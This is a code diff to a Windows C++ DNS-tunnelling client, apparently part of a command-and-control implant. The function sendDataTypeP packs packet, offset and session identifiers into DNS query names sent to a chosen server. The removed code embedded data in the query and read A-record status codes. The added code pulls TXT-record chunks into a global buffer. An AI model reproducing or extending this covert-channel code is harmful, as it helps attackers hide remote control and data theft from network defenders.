@@ -251,18 +251,18 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 	return retCode;
 }
 
-int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data)
+int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain)
 {
-	if (!domain || !data) {
+	if (!domain) {
 		return -1;
 	}
 
 	std::ostringstream fullStream;
-	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << data << "." << domain;
+	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << domain;
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	
-	WORD wType = DNS_TYPE_A; // 16
+	WORD wType = DNS_TYPE_TXT; // 16
 	PDNS_RECORD pDnsRecord = nullptr;
 	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
@@ -289,49 +289,34 @@ int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain
 		);
 		
 		
-		if (!status && pDnsRecord) {
-			IN_ADDR ipaddr;
-			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
-			std::string ipStr = inet_ntoa(ipaddr);
-			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
-			
-			size_t firstDot = ipStr.find(".");
-			if (firstDot == std::string::npos) {
-				goto cleanup;
-			}
-			
-			int code = std::stoi(ipStr.substr(0, firstDot));
-			
-			switch (code) {
-			case 200:  
-				retCode = 0;
-				goto cleanup;
-					
-			case 201:  
-				break;
-					
-			case 202: 
-				{
-					int new_id = startConnection(domain);
-					if (new_id != -1) {
-						id = new_id;
-					}
-				}
-				i--;  
-				break;
-					
-			case 203:  
-				packetNumber = 0;
-				i--;  
-				break;
-					
-			case 204: 
-				goto cleanup;
-					
-			default:
-				goto cleanup;
-			}
-		}
+		if (status == ERROR_SUCCESS && pDnsRecord) {
+
+            if (pDnsRecord->wType == DNS_TYPE_TXT &&
+                pDnsRecord->Data.TXT.dwStringCount > 0)
+            {
+                std::string txt = pDnsRecord->Data.TXT.pStringArray[0];
+
+                // --- TXT rỗng => hết chunk ---
+                if (txt.empty()) {
+                    retCode = 0;
+                    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+                    goto cleanup;
+                }
+
+                // --- Có chunk => lưu vào global ---
+                {
+                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
+					// TODO: Check lại kiểu dữ liệu, khả năng cao bị ghi đè, gửi sai dữ liệu
+                    g_outChunk = txt;
+                }
+
+                retCode = 1; // Có chunk
+                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+                goto cleanup;
+            }
+
+            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+        }
 		
 		Sleep(200); 
 	}
